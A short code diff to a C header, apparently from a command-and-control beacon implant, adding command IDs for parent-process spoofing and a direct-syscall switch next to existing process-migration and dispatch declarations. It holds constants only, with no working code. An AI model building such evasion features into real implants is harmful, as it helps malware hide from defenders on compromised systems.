@@ -63,6 +63,10 @@
 /* Migrate 子协议 */
 #define BEACON_COMMAND_MIGRATE             100u
 
+/* 进程创建策略（PPID 欺骗 / syscall 开关） */
+#define BEACON_COMMAND_SPAWN_PPID          110u
+#define BEACON_COMMAND_SYSCALL             111u
+
 /* 命令分发：根据 command_id 调用对应处理函数 */
 PacketList CommandDispatch(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, const ByteBuf* payload);
 
